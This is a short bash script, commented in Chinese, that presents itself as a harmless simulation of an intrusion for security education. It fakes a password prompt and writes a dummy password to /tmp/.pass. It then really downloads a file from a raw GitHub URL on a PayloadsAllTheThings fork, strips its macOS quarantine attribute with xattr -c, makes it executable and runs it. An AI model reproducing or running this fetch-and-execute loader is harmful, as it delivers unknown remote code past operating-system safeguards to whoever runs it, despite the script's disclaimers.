#!/bin/bash
# 安全测试脚本 - 用于模拟入侵过程
# 仅用于安全研究和教育目的

echo "🔒 安全测试脚本启动"
echo "⚠️  警告：这是一个用于安全研究的测试脚本"
echo ""

# 获取当前用户
username=$(whoami)
echo "当前用户: $username"

# 模拟密码收集过程（不实际收集密码）
echo "模拟密码收集过程..."
echo "System Password: [模拟输入]"
echo "密码验证: 模拟成功"
echo ""

# 创建测试密码文件
echo "模拟密码保存到 /tmp/.pass"
echo "test_password_123" > /tmp/.pass
echo ""

# 从服务器下载文件
echo "从服务器下载文件..."
echo "目标文件: /tmp/update"

# 检查本地服务器是否运行
if curl -s https://github.com/ > /dev/null 2>&1; then
    
    # 下载测试文件
    if curl -o /tmp/update https://raw.githubusercontent.com/yq00/PayloadsAllTheThings/refs/heads/master/update; then
        echo "✅ 文件下载成功"
        
        # 显示下载的文件内容
        echo ""
        echo "📄 下载的文件内容:"
        echo "=================="
        cat /tmp/update
        echo "=================="
        echo ""
        
        # 模拟权限操作
        echo "模拟权限操作..."
        echo "清除文件扩展属性: xattr -c /tmp/update"
        xattr -c /tmp/update 2>/dev/null || echo "xattr 命令执行（模拟）"
        
        echo "添加执行权限: chmod +x /tmp/update"
        chmod +x /tmp/update
        
        echo ""
        echo "🚀 执行下载的文件..."
        echo "=================="
        /tmp/update
        echo "=================="
        echo ""
        
    else
        echo "❌ 文件下载失败"
    fi
else
    echo "❌ 网络连接失败"
fi

# 清理测试文件
echo "🧹 清理测试文件..."
rm -f /tmp/.pass

echo ""
echo "✅ 测试完成"
